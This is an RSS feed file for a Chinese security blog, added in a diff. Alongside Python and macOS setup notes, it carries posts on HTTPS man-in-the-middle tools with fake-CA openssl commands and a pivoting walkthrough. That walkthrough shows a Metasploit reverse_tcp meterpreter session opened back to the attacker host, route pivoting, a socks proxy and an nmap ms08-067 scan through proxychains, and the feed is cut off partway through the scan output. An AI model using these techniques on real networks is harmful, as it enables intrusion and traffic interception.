@@ -1,0 +1,1398 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
+  <channel>
+    <title>quanyechavshuo</title>
+    <description>A blog about programming and network security</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Mon, 20 Mar 2017 12:01:53 +0800</pubDate>
+    <lastBuildDate>Mon, 20 Mar 2017 12:01:53 +0800</lastBuildDate>
+    <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>python tips</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;About python tips on &quot;bugs&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.python2/3在os.path.exists(&quot;~/...&quot;)时,无法自动识别当前系统的~目录,eg.macOS下的~为/var/root,ubuntu下的~为
+/root,os.path.exists(&quot;~/1.txt&quot;)不认识~.
+
+后来发现这不是bug,os.path.expanduser(&quot;~&quot;)可以认识~,http://www.cnblogs.com/xupeizhi/archive/2013/02/20/2918243.html
+
+2.python以&quot;a+&quot;模式读文件读出的内容为空,要将文件指针移到开关再读,f=open(&quot;..&quot;,&quot;a+&quot;) &amp;amp;&amp;amp; f.seek(0) &amp;amp;&amp;amp; f.read()
+http://stackoverflow.com/questions/14639936/how-to-read-from-file-opened-in-a-mode
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</description>
+        <pubDate>Fri, 17 Mar 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/python/2017/03/17/python-tips/</link>
+        <guid isPermaLink="true">http://localhost:4000/python/2017/03/17/python-tips/</guid>
+        
+        <category>tips</category>
+        
+        <category>python</category>
+        
+        
+        <category>python</category>
+        
+      </item>
+    
+      <item>
+        <title>https劫持理解</title>
+        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://www.zhihu.com/question/22795329
+2.http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-https与ssl&quot;&gt;0x01 https与ssl&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssl:secure socket layer安全套接层,https,ftps等都是建立在ssl基础上
+https协议:建立在ssl协议之上的http协议[http over ssl](http协议建立在tcp协议之上)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-ssltls协议握手过程&quot;&gt;0x02 ssl/tls协议握手过程&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1)公钥私钥证书
+
+一般来讲:
+证书文件后缀:.crt,.pem
+私钥文件后缀:.key
+(这篇文章里说的&quot;嘗試對 SSL Private Key 下手&quot;应该是错的,那应该是SSL Public Key,
+http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/)
+证书请求文件:.csr
+公钥加密的数据只有私钥能解开,同样,私钥加密的数据用公钥可以解开
+
+公钥存放在证书文件中,证书相当于锁开着的箱子,私钥相当于箱子的锁的钥匙,ssl通信中的一方A利用证书中的公钥和某种协商
+好的加密算法将要发送到另一方B的数据加密,这个动作相当于把东西放进箱子并将锁关闭,B收到被锁的箱子后用私钥打开锁就看
+到明文了,实现了加密通信.
+
+更详细情况可见:
+http://www.fzb.me/2015-1-15-openssl-rsa.html
+https://www.zhihu.com/question/29620953
+
+2)ssl/tls协议握手过程
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dot/ssl/sslfinal.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;0x03-几种https会话劫持工具&quot;&gt;0x03 几种https会话劫持工具&lt;/h3&gt;
+
+&lt;h4 id=&quot;0xa-sslstrip&quot;&gt;0xa sslstrip&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;详情:https://software.intel.com/zh-cn/blogs/2011/10/11/ssl
+
+用户输入www.baidu.com,通过arp欺骗使得browser不会访问到真正的http://www.baidu.com,而http://www.baidu.com的内容是
+跳转到https://www.baidu.com,也即通过arp欺骗将browser的会话由https劫持成http,并由中间人与www.baidu.com服务器正常
+https通信
+
+缺点:使用有局限,要求用户输入url的时候没有输入https[一般用户不输入http或https,而是直接输入www.baidu.com]
+优点:受害用户在访问www.baidu.com的时候browser不会提示证书不可信
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xb-sslsplit&quot;&gt;0xb sslsplit&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sslsplit与cain几乎相同,只是sslsplit的证书是攻击者通过如下命令手动创建的
+openssl genrsa -out ca.key 4096
+openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
+
+而cain的证书是中间人向真实服务器主动获取并修改的
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xc-cain&quot;&gt;0xc cain&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;中间人与browser和www.baidu.com服务器都进行正常ssl握手,中间人通过arp欺骗将自己伪装成www.baidu.com服务器,劫持受害
+机器的browser的https://www.baidu.com/login.php的请求,中间人向www.baidu.com服务器请求证书,获取证书后将证书中的公
+钥修改成中间人自己设置的公钥(中间人一般无法得到www.baidu.com服务器的私钥,私钥保存在www.baidu.com服务器上),并将
+修改后的证书发给browser,browser看到证书可疑,提示用户证书可疑,用户不懂,选择将目标https://www.baidu.com添加到可信
+任列表,之后browser正常请求https://www.baidu.com/login.php,与中间人进行ssl握手,此时的browser发给中间人的加密的数
+据是用中间人修改过的公钥加密的,中间人有这个公钥的私钥[因为这个这个公钥私钥对是中间人伪造生成的],于是中间人用私
+钥解密browser发过来的数据,再与www.baidu.com服务器走正常的ssl流程,也即将这解密后的数据重新加密发给www.baidu.com
+服务器.而中间人在得到www.baidu.com返回的数据后将它解密后再加密发给browser,browser再正常地用与中间人ssl握手要用
+的密钥来解密这个加密后的数据.
+
+也即整个过程中,www.baidu.com服务器并不知道有中间人的存在,一直把中间人当作正常的browser,而中间人能和
+www.baidu.com服务器进行正常的ssl握手(https通信)是因为中间人从browser那里得到解密后的数据,知道自己要访问什么内容
+,于是正常走https协议访问.而browser与中间人的通信也一直是正常的ssl握手,只是对browser来讲,对方&quot;服务器&quot;(中间人)的
+证书有问题,因为对方的公钥好像被修改过,无法被受害机器的browser验证为可信证书.
+
+缺点:欺骗过程中browser会提示受害用户证书不可信
+优点:一般用户会选择将要访问的网站加入到可信任列表,使得https劫持成功
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x04-私钥文件的用途&quot;&gt;0x04 私钥文件的用途&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;私钥的用途1:
+如果中间人通过web等手段进入了www.baidu.com服务器,取出www.baidu.com的私钥,然后再进行https劫持,这样brower在访问
+www.baidu.com的时候就不会发现证书有问题了,这样中间人也不用伪造证书,直接用www.baidu.com的证书,将证书发给
+browser,再与browser进行正常ssl握手即可,所有加密的数据都可以由中间人解密,因为中间人有www.baidu.com的公钥和私钥.
+其中,公钥在证书中,公钥用来加密发出的数据,私钥在中间人机器上,私钥用来解密browser发过来的数据.
+
+私钥的用途2:结合wireshark利用得到的私钥解密ssl/tls流量
+https://support.citrix.com/article/CTX135121
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Thu, 16 Mar 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/03/16/https%E5%8A%AB%E6%8C%81%E7%90%86%E8%A7%A3/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/03/16/https%E5%8A%AB%E6%8C%81%E7%90%86%E8%A7%A3/</guid>
+        
+        <category>https</category>
+        
+        <category>ssl</category>
+        
+        <category>mitm</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>安装macOS sierra要做的事</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;实际操作系统:
+    macOS sierra 10.12.3
+
+关于本文:
+    记录新安装macOS sierra配置合适工作环境所遇到的坑与解决办法
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.apple store下载安装xcode
+
+2.安装howebrew,https://brew.sh/,如果无法安装,尝试连VPN后再安装,更多homebrew安装失败的问题可参考
+https://www.zhihu.com/question/35928898
+
+3.设置root用户可登录,https://support.apple.com/zh-cn/HT204012,以后用root登录(但是brew安装工具不让用root安装),需要
+用brew安装工具时su - 普通用户 再安装
+
+4.用root用户登录进行操作后发现root用户登录下mac app store无法打开(siri和ibooks也无法打开,这应该是macos的bug),如果
+要安装常用的mac app store下的软件,可注销root用户,用普通用户登录后使用mac app store安装相关软件(eg.wechat)
+
+5.mac apple store下载star vpn
+
+6.安装清源五笔输入法
+
+7.下载keyboard maestro,设置打开terminal.app快捷键为command+r,要注意的是安装了keyboard maestro之后不要安装 
+Karabiner-Elements,否则Karabiner-Elements会影响系统按键导致系统键盘修饰设置无效与keyboard maestro设置失效.
+在Automator中新建一个服务,在文件夹上可以右键打开终端,关于终端的两个选项都可勾选上
+
+8.tmux+zsh+MacVim
+1)安装zsh
+注意,安装zsh不能用brew安装,因为brew安装工具现在不支持用root用户来安装,如果要用brew来安装zsh,这样安装好的zsh一般位
+于/usr/local/bin/zsh,这样的zsh的tab在root用户登录系统后无法补全,因为zsh是非root用户安装的,
+用非root用户登录时tab才有补全的功能,但是习惯用root用户登录,这样tab没有补全功能,于是不用brew安装zsh,用系统自带的
+/bin/zsh就好了
+chsh -s /bin/zsh
+https://github.com/robbyrussell/oh-my-zsh安装oh-my-zsh
+https://github.com/3xp10it/.zshrc安装我的配置
+
+2)安装tmux
+https://github.com/tmux/tmux/releases下载最新release版本后安装,安装方法一般为:
+./configure
+make
+make install
+rm -r ~/tmux
+https://github.com/3xp10it/.tmux安装我的配置
+
+3)安装MacVim
+安装MacVim是因为在macOS上安装vim有无法使用系统剪切板的问题
+a)https://github.com/macvim-dev/macvim/releases/下载最新release版
+b)在~/.zshrc中加入:
+alias mvim='/Applications/MacVim.app/Contents/MacOS/Vim'
+alias vim='mvim'
+c)解决MacVim无法使用系统剪切板的问题
+http://stackoverflow.com/questions/39645253/clipboard-failure-in-tmux-vim-after-upgrading-to-macos-sierra
+Attention:
+vim8下不用加set clipboard=unnamed
+在.tmux.conf更新后要执行tmux kill-server,否则就算重启也没用
+也即,要解决这个问题要做下面三步:
+第一步:brew install reattach-to-user-namespace
+第二步:在.tmux.conf中加入:
+set -g default-shell $SHELL 
+set -g default-command &quot;reattach-to-user-namespace -l ${SHELL}&quot;
+第三步:tmux kill-server
+d)https://github.com/3xp10it/.vimrc安装我的配置
+e)让配置生效
+git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim
+:PlugInstall(!)[other cmds are like:PluginUpdate,PlugeinClean,PluginList]
+f)安装YouCompleteMe
+g)macOS caps键处理,将caps映射为按一下为esc,按住为ctrl,具体如下:
+http://longhua.io/how-to-map-caps-lock-to-both-control-and-escape-in-macos-sierra.html
+[https://imciel.com/2016/09/09/macos-sierra-capslock-escape/这个方法好像更好]
+
+9.brew install wget
+
+10.安装firefox,在firefox中:
+1)恢复书签https://github.com/3xp10it/firefoxBookmarks
+2)安装vimperator,并安装我的配置文件
+  要将https://raw.githubusercontent.com/macvim-dev/macvim/master/src/MacVim/mvim文件存放到本地/usr/shrae/mvim,
+  chmod +x /usr/share/mvim[如果不能放则要关闭macOS sierra的SIP]
+  这样.vimperatorrc中的设置vimperator的编辑器为/usr/share/mvim才有效(这里的mvim与~/.zshrc中的mvim效果不同
+  ,~/.zshrc中的mvim是为了在终端下用macvim,这里的/usr/share/mvim是为了在vimperator中ctrl+i时用MacVim作为Editor以
+  gui形式出现)
+3)安装插件:
+s3 google translator
+hackbar
+...
+
+11.让finder标题显示当前路径
+defaults write com.apple.finder _FXShowPosixPathInTitle -bool YES 
+killall Finder
+
+12.其他文件的恢复,git密码配置文件,pypi配置文件,jekyll博客环境等
+
+13.macOS分屏
+https://sspai.com/post/36983
+下载magnet破解版,设置快捷键如下:
+ctrl+command+i:上半屏
+ctrl+command+k:下半屏
+ctrl+command+h:左半屏
+ctrl+command+l:右半屏
+shift+command+u:左上屏
+shift+command+i:右上屏
+shift+command+j:左下屏
+shift+command+k:右下屏
+ctrl+command+enter:整屏
+
+14.设置快捷键
+keyboard maestro设置:
+打开finder快捷键为command+e
+打开快速搜索快捷键为ctrl+s
+打开终端iterm2为command+r
+跳转到桌面设置为command+d
+设置command+shift+h为command+up,可在finder中跳转到上一级目录
+设置command+shitf+l为command+down,可在finder中跳转到下一级目录(这里不设置成command+l为command+down是因为
+command+l是firefox中的跳转到url定位栏快捷键)
+设置command+j为down,设置command+k为up,因为down和up键不好按,小而远
+设置magnet的快捷键:
+ctrl+command+ikjl分别为上下左右,左上左下右上右下暂不设置,用得少
+设置alfred的呼出键为double command
+设置vimperator中ctrl+hljk为up,down,left,right,在是在url状态栏中无效(用ctrl+i编辑器编辑),其他输入框有效
+
+15.关闭macOS的SIP
+https://www.igeeksblog.com/how-to-disable-system-integrity-protection-on-mac/
+也即在恢复模式下终端运行:csrutil disable,然后重启
+
+16.git命令error: RPC failed; curl 56 SSLRead() return error错误的解决办法:
+--------------来自网上的可靠解决方法-----------
+http://stackoverflow.com/questions/30385939/git-clone-fails-with-sslread-error-on-os-x-yosemite
+也即:
+brew remove git
+brew remove curl
+brew install openssl
+brew install --with-openssl curl
+brew install --with-brewed-curl --with-brewed-openssl git
+
+error: RPC failed; curl 56 SSL read: error:00000000:lib(0):func(0):reason(0), errno54错误解决方法:
+http://www.jianshu.com/p/4edd496229d5
+也即:
+1)在新mac系统上配置新ssh key
+2)git config --global http.postBuffer 524288000
+----------------end-----------------
+试了上面的方法,遇到障碍,要解决升级openssl的问题,由于macOS默认的openssl在/usr/bin/openssl下,macOS系统中其他工具依
+赖的openssl的路径为系统默认的/usr/bin/openssl,而brew安装的新版本的openssl的路径为/usr/local/bin/openssl[实际路径
+为/usr/local/Cellar/openssl/1.0.2k/bin/openssl],于是执行以下操作:
+-----------------my final solution:---------------
+brew remove git
+brew remove curl
+brew install openssl[如果失败则--force]
+mv /usr/bin/openssl /usr/bin/openssl_old[备份原来的openssl]
+ln -s /usr/local/Cellar/openssl/1.0.2k/bin/openssl[这个实际路径有可能会随着时间变化] /usr/bin/openssl
+brew install --with-openssl curl
+brew install --with-brewed-curl --with-brewed-openssl git
+到这里应该会发现git clone没有出现RPC failed,curl...的错误了,如果还有错误,则继续完成这里的操作http://www.jianshu.com/p/4edd496229d5
+--------------------end-----------------------
+
+17.安装Alfred,Go2Shell,1Password,cd to
+
+18.设置一个备份计划任务,macOS用launchctl实现:
+    cd /Library/LaunchDaemons
+    vi macosbak.plist:
+    ----------macosbak.plist---------
+    &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+    &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
+    &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
+    &amp;lt;dict&amp;gt;
+      &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
+      &amp;lt;string&amp;gt;macosbak.plist&amp;lt;/string&amp;gt;
+      &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
+      &amp;lt;array&amp;gt;
+          &amp;lt;string&amp;gt;/usr/share/mytools/macosbak.sh&amp;lt;/string&amp;gt;
+      &amp;lt;/array&amp;gt;
+      &amp;lt;key&amp;gt;StartCalendarInterval&amp;lt;/key&amp;gt;
+      &amp;lt;dict&amp;gt;
+            &amp;lt;key&amp;gt;Minute&amp;lt;/key&amp;gt;
+            &amp;lt;integer&amp;gt;15&amp;lt;/integer&amp;gt;
+            &amp;lt;key&amp;gt;Hour&amp;lt;/key&amp;gt;
+            &amp;lt;integer&amp;gt;22&amp;lt;/integer&amp;gt;
+      &amp;lt;/dict&amp;gt;
+      &amp;lt;key&amp;gt;StandardOutPath&amp;lt;/key&amp;gt;
+    &amp;lt;string&amp;gt;/private/var/root/Documents/AutoMakeLog.log&amp;lt;/string&amp;gt;
+    &amp;lt;key&amp;gt;StandardErrorPath&amp;lt;/key&amp;gt;
+    &amp;lt;string&amp;gt;/private/var/root//Documents/AutoMakeLog.err&amp;lt;/string&amp;gt;
+    &amp;lt;/dict&amp;gt;
+    &amp;lt;/plist&amp;gt;
+    -------------end---------------
+    launchctl load macosbak.plist
+
+    表示每天22:15备份系统文件,有两个要注意的地方:
+    1.运行脚本的地方不能直接写命令,不能写/bin/bash/usr/share/mytools/macosbak.sh,
+    要写文件路径(也即/usr/shrae/mytools/macosbak.sh)
+    2.这个文件事先要:
+    chmod +x /usr/share/mytools/macosbak.sh
+    3.更多细节可参考:
+    http://honglu.me/2014/09/20/OSX系统添加定时任务/
+
+    macosbak.sh可见:
+    https://raw.githubusercontent.com/3xp10it/mytools/master/macosbak.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sat, 11 Mar 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/linux/2017/03/11/%E5%AE%89%E8%A3%85macOS-sierra%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B/</link>
+        <guid isPermaLink="true">http://localhost:4000/linux/2017/03/11/%E5%AE%89%E8%A3%85macOS-sierra%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B/</guid>
+        
+        <category>macOS</category>
+        
+        <category>sierra</category>
+        
+        
+        <category>linux</category>
+        
+      </item>
+    
+      <item>
+        <title>ssh正向反向代理理解</title>
+        <description>&lt;h3 id=&quot;条件&quot;&gt;条件:&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;正身代理和反向代理都满足:
+A能访问B,B能访问C,A不能访问C
+假设A想访问C的80端口
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;正向代理&quot;&gt;正向代理:&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A有B的ssh口令和密码,A利用B的ssh口令和密码来控制B给A做流量代理,A将要访问C的80端口的需求发给B,由B代理访问
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/正向代理.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;反向代理&quot;&gt;反向代理:&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C有B的ssh口令和密码,C利用B的ssh口令和密码来控制将C的80端口绑定到B的8000[或其他]端口,这样A访问B的8000端口
+就相当于访问C的80端口
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/反向代理.png&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 24 Feb 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/</guid>
+        
+        <category>ssh</category>
+        
+        <category>代理</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>多重转发渗透隐藏内网</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;内网机器如下:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://pentest.blog/wp-content/uploads/final.png&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;说明:
+1)Attacker为攻击者,有一个网卡,网段为172.16.0.0,Attacker系统为kali系统
+2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段
+3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs bof两个漏洞,可getshell
+4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell
+5)起初Attacker只拿到RD的msf的shell,对于目标内网情况一无所知,也不知道存在7.7.7.0和8.8.8.0这两个隐藏的网段
+6)目标是准备通过RD来渗透内网中7.7.7.0和8.8.8.0两个隐藏的网段
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-step1&quot;&gt;0x01 Step1&lt;/h3&gt;
+
+&lt;p&gt;Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler 
+msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp
+payload =&amp;gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &amp;gt; set LHOST 172.16.0.20 
+LHOST =&amp;gt; 172.16.0.20
+msf exploit(handler) &amp;gt; set LPORT 1234
+LPORT =&amp;gt; 1234
+msf exploit(handler) &amp;gt; run
+[*] Started reverse TCP handler on 172.16.0.20:1234 
+[*] Starting the payload handler...
+[*] Sending stage (957487 bytes) to 172.16.0.11
+[*] Meterpreter session 2 opened (172.16.0.20:1234 -&amp;gt; 172.16.0.11:49162)
+meterpreter &amp;gt; ifconfig
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+Interface 11
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:e1:3f:af
+MTU          : 1500
+IPv4 Address : 172.16.0.11
+IPv4 Netmask : 255.255.255.0
+Interface 19
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
+Hardware MAC : 08:00:27:7f:3c:fe
+MTU          : 1500
+IPv4 Address : 7.7.7.11
+IPv4 Netmask : 255.255.255.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-step2&quot;&gt;0x02 Step2&lt;/h3&gt;
+
+&lt;font color=&quot;#33ccff&quot;&gt;
+发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由[不添加路由也可以直接用meterpreter shell中的模块访问
+到7.7.7.x网段,添加路由的目的是为了使得msf模块可以访问到7.7.7.x网段],meterpreter shell可以访问到7.7.7.x网段,msf
+中的模块不能访问到7.7.7.x网段,msf中的模块所处的ip是攻击者的ip,meterpreter shell所处的ip是RD的ip.在meterpreter中
+添加路由的目的是为了给msf模块作代理,也即给Attacker作代理,但是只能给Attacker的msf模块作代理,要想给Attacker的其他
+应用程序作代理,则需要在meterpreter添加路由后再运行msf的开启sock4的模块,然后再用proxychains来设置Attacker的其他
+应用程序的代理为msf的开启sock4代理模块中设置的代理入口.
+&lt;/font&gt;
+&lt;p&gt;操作如下:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run autoroute -s 7.7.7.0/24
+[*] Adding a route to 7.7.7.0/255.255.255.0...
+[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
+[*] Use the -p option to list all active routes
+meterpreter &amp;gt; run autoroute -p
+Active Routing Table
+====================
+ Subnet Netmask Gateway
+ ------ ------- -------
+ 7.7.7.0 255.255.255.0 Session 2
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后开始扫描7.7.7.0网段,操作如下:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
+[*] Running module against DISCORDIA
+[*] ARP Scanning 7.7.7.0/24
+[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
+[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
+[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
+[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;arp_scanner不太够用,不能扫到端口信息[此时也可用msf自带的其他可以扫描端口的模块如auxiliary/scanner/portscan/tcp来扫
+描,因为前面添加了路由,使得msf中的模块可以用meterpreter作为代理访问到7.7.7.x网段],于是用Attacker本机的nmap来扫[可以
+更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开sockets4代理,然后用proxychains设置nmap的代理为msf模块开
+启的Attacker的1080端口提供的代理,操作如下:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background 
+[*] Backgrounding session 2...
+msf &amp;gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &amp;gt; show options 
+Module options (auxiliary/server/socks4a):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+Auxiliary action:
+   Name   Description
+   ----   -----------
+   Proxy  
+msf auxiliary(socks4a) &amp;gt; set srvhost 172.16.0.20
+srvhost =&amp;gt; 172.16.0.20
+msf auxiliary(socks4a) &amp;gt; run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+msf auxiliary(socks4a) &amp;gt; netstat -antp | grep 1080
+[*] exec: netstat -antp | grep 1080
+tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
+msf auxiliary(socks4a) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;proxychains设置/etc/proxychains.conf如下:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &quot;tor&quot;
+#socks4  127.0.0.1 9050
+socks4  172.16.0.20 1080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;nmap扫描如下:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.25BETA1 ( https://nmap.org )
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
